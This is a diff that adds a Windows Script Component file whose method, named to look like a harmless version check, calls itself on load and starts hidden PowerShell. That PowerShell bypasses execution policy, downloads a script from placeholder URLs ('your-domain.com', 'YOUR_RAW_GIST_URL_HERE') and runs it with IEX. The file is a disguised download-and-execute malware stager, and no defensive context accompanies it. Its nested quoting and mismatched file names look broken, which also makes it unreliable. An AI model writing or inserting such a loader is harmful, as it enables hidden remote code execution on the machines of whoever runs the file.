@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+<component>
+<public>
+    <method name="XMLCheckServiceVersion"/>
+</public>
+<script language="VBScript">
+<![CDATA[
+    Sub XMLCheckServiceVersion()
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://your-domain.com/HP.vbs' -OutFile '$env:TEMP\HP'; & wscript.exe //E:vbscript HiddenPowershell.vbs -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://YOUR_RAW_GIST_URL_HERE')""", 0
+    End Sub
+
+    XMLCheckServiceVersion()
+]]>
+</script>
+</component>
